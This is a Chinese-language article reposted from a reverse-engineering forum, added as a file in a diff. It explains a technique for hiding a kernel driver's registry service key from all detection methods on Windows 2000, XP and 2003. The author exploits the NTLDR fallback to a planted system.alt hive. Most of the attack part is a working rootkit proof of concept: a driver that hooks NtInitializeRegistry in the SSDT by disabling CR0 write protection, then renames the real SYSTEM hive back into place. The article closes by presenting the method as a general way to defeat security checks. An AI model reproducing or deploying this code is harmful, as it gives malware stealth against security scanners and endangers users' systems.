@@ -1,0 +1,274 @@
+
+# 绕过所有的注册表检查隐藏驱动注册表
+
+> 原文：[`www.pediy.com/kssd/pediy10/90467.html`](https://www.pediy.com/kssd/pediy10/90467.html)
+
+几个月前，我曾在某些帖子谈论过这个技术。现在六一节到了，为了满足广大饥渴的小朋友们，特此放出。
+
+=====================================================
+
+`Mark` 在 `Windows Internals 4th` (p 210)中提到过，`WIN2000` 下，为了保持系统 `HIVE` 的完整性，系统在刷新 `SYSTEM HIVE` 的同时，会刷新一个名为“替补储巢”的 hive :`system.alt`。
+
+当系统储巢 `System` 已经损坏，无法加载时，就会选择这个替补储巢 `system.alt` 来加载。这是由于 `win2000` 的 `ntldr` 不知道如何使用储巢日志文件(`system.log`)来进行储巢修复导致的，`Mark` 称 `windows XP` 以后的系统已经抛弃了这一机制。
+
+但事实如何呢？首先我们来看一下某份 `NT4` 的代码：
+
+下面这个函数是 `BootLoader`(`ntldr`)用来加载系统 `HIVE` 的函数：
+
+```
+ARC_STATUS
+BlLoadAndScanSystemHive(
+    IN ULONG DeviceId,
+    IN PCHAR DeviceName,
+    IN PCHAR DirectoryPath,
+    IN PWSTR BootFileSystem,
+    OUT PCHAR BadFileName
+    )
+...................
+省略无关部分
+.....................
+
+    strcpy(Directory,DirectoryPath);
+    strcat(Directory,"\\system32\\config\\");
+    Status = BlLoadAndInitSystemHive(DeviceId,
+                                      DeviceName,
+                                      Directory,
+                                      "system",
+                                      FALSE,
+                                      &RestartSetup);
+
+    if(Status != ESUCCESS) {
+        //
+        // bogus hive, try system.alt
+        //
+        Status = BlLoadAndInitSystemHive(DeviceId,
+                                          DeviceName,
+                                          Directory,
+                                          "system.alt",
+                                          TRUE,
+                                          &RestartSetup);
+        if(Status != ESUCCESS) {
+            strcpy(BadFileName,DirectoryPath);
+            strcat(BadFileName,"\\SYSTEM32\\CONFIG\\SYSTEM");
+            goto HiveScanFailed;
+        }
+    }
+```
+
+可以看到，系统首先会尝试加载 `system` hive，当 `systemroot\\system32\\config` 下的 `SYSTEM HIVE` 不存在或出现故障，则会尝试加载 `systemroot\\system32\\config` 下的 `system.alt` HIVE。
+
+事实上，这部分代码一直保留在 `WINDOWS XP` 和 `WINDOWS 2003` 中，直到 `VISTA` 中才去除掉，`VISTA` 系统中已更改为仅加载 `SYSTEM` 储巢，如果 `SYSTEM` 储巢加载失败，直接拒绝继续启动。
+
+但是，这里只是 `NTLDR` 加载的储巢，这些储巢在系统启动后会被丢弃（保存在 `BootLoaderBlock` 中）。
+
+`SMSS` 将调用 `SSDT` 中的 `NtInitializeRegistry` 函数，通过 `CmpCmdInit->CmpInitializeHiveList`，通过 `CmpLoadHiveThread` 系统线程为 `CmpMachineHiveList` 中的每个系统储巢做加载和初始化工作。
+
+这里系统只识别`\\SystemRoot\\System32\\Config\\System` 储巢，如果无法加载这个储巢，系统将调用 `KeBugCheckEx` 使系统蓝屏，蓝屏代码为 `STATUS_CANNOT_LOAD_REGISTRY_FILE`。
+
+有了上面的知识，我们很容易便可知道如何隐藏一个注册表了：
+
+只要我们将当前 `SYSTEM` 储巢删除或者使其无法正确识别，然后在 `config` 目录下保留包含了我们的驱动服务项的 `SYSTEM.ALT` 储巢，此时重启系统，`NTLDR` 会使用我们的 `SYETEM.ALT` 储巢，于是会加载我们的驱动程序。
+
+我们在驱动中，`HOOK NtInitializeRegistry` 函数，等待 `NT` 内核再次初始化系统储巢，等到后，我们将 `SYSTEM` 储巢恢复（`move file / fix file /redir file...`），此时系统就能正常引导了。
+
+但是此时系统加载的是不包含我们的驱动服务项的储巢，所以任何利用正常、非正常枚举手法进行的检测，都检测不到我们的驱动注册表。无论是还原 `nt*key` 函数进行枚举，还是使用 `cm*key` 进行枚举，还是使用所谓的 `Hive` 解析技术进行枚举。
+
+下面是一个这个驱动的小 `POC`，代码如下：
+
+```
+#include "ntddk.h"
+#include "ntifs_48.h"
+#include "zwfunc.h"
+#include "stdafx.h"
+
+#define MYDEBUG 1
+
+#if MYDEBUG
+
+#define KDMSG(_x_) DbgPrint _x_
+
+#else
+
+#define KDMSG(_x_)
+
+#endif
+ULONG OldNtInitializeRegistry =0;
+BOOL SystemHiveIsBuild = FALSE ; 
+const WCHAR RealSystemHiveLocation[] = L"\\SystemRoot\\System32\\Config\\SYSTEM";
+
+
+NTSTATUS NewNtInitializeRegistry(USHORT BootCondition)
+{
+NTSTATUS stat ; 
+HANDLE hfile ; 
+IO_STATUS_BLOCK iosb ;
+OBJECT_ATTRIBUTES oba ; 
+UNICODE_STRING FileName ; 
+UNICODE_STRING SystemSave ;
+
+KDMSG(("NtInitializeRegistry is call!"));
+
+if (SystemHiveIsBuild == FALSE)
+{
+   RtlInitUnicodeString(&FileName , RealSystemHiveLocation);
+   
+
+   InitializeObjectAttributes(&oba , &FileName , OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE , 0 , 0 );
+
+
+   stat = IoCreateFile(&hfile , 
+    FILE_ALL_ACCESS ,
+    &oba ,
+    &iosb,
+    NULL,
+    FILE_ATTRIBUTE_NORMAL , 
+    FILE_SHARE_READ | FILE_SHARE_WRITE , 
+    FILE_OPEN , 
+    FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT ,
+    NULL,
+    0,
+    CreateFileTypeNone , 
+    0,
+    IO_NO_PARAMETER_CHECKING);
+
+   KDMSG(("open config\\system return %08x\n",stat));
+
+   if (!NT_SUCCESS(stat))
+   {
+    if (stat != STATUS_OBJECT_NAME_NOT_FOUND && stat != STATUS_OBJECT_PATH_NOT_FOUND)
+    {
+     goto end ; 
+    }
+   }
+   else
+   {
+    ZwClose(hfile);
+    goto end ;
+   }
+
+   //now system hive is not found
+
+  //move file
+  { 
+   PFILE_RENAME_INFORMATION renameinfo ;
+
+   renameinfo = (PFILE_RENAME_INFORMATION)ExAllocatePool(NonPagedPool , sizeof(FILE_RENAME_INFORMATION) + sizeof(RealSystemHiveLocation) - sizeof(WCHAR));
+
+   renameinfo->FileNameLength = sizeof(RealSystemHiveLocation) - sizeof(WCHAR);
+   renameinfo->ReplaceIfExists = TRUE ; 
+   renameinfo->RootDirectory = 0 ; 
+   RtlCopyMemory((PVOID)renameinfo->FileName, (PVOID)RealSystemHiveLocation , sizeof(RealSystemHiveLocation));
+
+   RtlInitUnicodeString(&FileName , L"\\SystemRoot\\System32\\SYSTEM");
+    
+    
+   InitializeObjectAttributes(&oba , &FileName , OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE , 0 , 0 );
+    
+    
+   stat = IoCreateFile(&hfile , 
+    FILE_ALL_ACCESS ,
+    &oba ,
+    &iosb,
+    NULL,
+    FILE_ATTRIBUTE_NORMAL , 
+    FILE_SHARE_READ | FILE_SHARE_WRITE , 
+    FILE_OPEN, 
+    FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT ,
+    NULL,
+    0,
+    CreateFileTypeNone , 
+    0,
+    IO_NO_PARAMETER_CHECKING);
+
+   KDMSG(("open system\\system return %08x\n" , stat));
+
+   if (!NT_SUCCESS(stat))
+   {
+    ExFreePool(renameinfo);
+    goto end ;   
+   }
+
+   stat = ZwSetInformationFile(hfile , 
+    &iosb , 
+    renameinfo ,
+     sizeof(FILE_RENAME_INFORMATION) + sizeof(RealSystemHiveLocation) - sizeof(WCHAR) ,
+     FileRenameInformation);
+
+   KDMSG(("rename file return %08x\n" , stat));
+
+   ZwClose(hfile);
+    
+   SystemHiveIsBuild = TRUE ; 
+  }
+
+}
+
+end:
+__asm
+{
+   movzx eax , BootCondition
+   push eax
+   call OldNtInitializeRegistry
+   mov     stat ,eax
+}
+
+return stat ; 
+}
+NTSTATUS DriverEntry(PDRIVER_OBJECT Drvobj , PUNICODE_STRING RegistryPath)
+{
+ULONG OldCr0 ;
+//drv load, hook NtInitializeRegistry
+
+//IN WINDOWS XP , index of ZwInitializeRegistry is 0x5c
+
+__asm{
+   push eax
+   push ebx
+   cli
+    
+   mov eax , cr0
+   
+   mov OldCr0 , eax
+   
+   and eax , 0xFFFEFFFF
+    
+   mov cr0 , eax
+
+   mov eax ,dword ptr[KeServiceDescriptorTable]
+   
+   mov eax , dword ptr[eax]
+   //get service base
+
+   mov ebx , dword ptr[eax + 0x5c * 4]
+
+   mov OldNtInitializeRegistry , ebx
+
+   mov ebx , NewNtInitializeRegistry
+
+   mov dword ptr[eax + 0x5c * 4] , ebx
+
+   mov eax , OldCr0
+
+   mov cr0 , eax
+
+   sti
+
+   pop ebx
+   
+   pop eax
+
+}
+
+return STATUS_SUCCESS ; 
+}
+```
+
+另外，如前面所说，这个技术是无法用于 `WINDOWS VISTA / 7` 的，`VISTA` 的 `WINLOAD.EXE` 中已经去掉了这种机制。
+
+当然，这只是一个技巧，但是反映了一些思想：
+
+1. 所谓绕过检查，就是要让系统在某一时刻认为你是存在的，而某一时刻认为你是不存在的，利用信息的不对称来使检查失效。
+
+2. `NTLDR` 和 `NTOSKRNL` 之间，也算是一种信息不对称，例如 `TOPHET`,例如本篇这个技巧，都是利用 `NTLDR` 中缺少某种机制，而 `NTOSKRNL` 中存在这种机制，由于 `NTLDR` 缺少这种机制（例如 `TOPHET` 中，访问 `SCSI` 驱动器的机制），那么自然给了攻击者可趁之机。
+
+当然，微软在 `VISTA` 中大大弥补了这些不对称，但是可想而知，还是有更多的未知等着大家去探索。
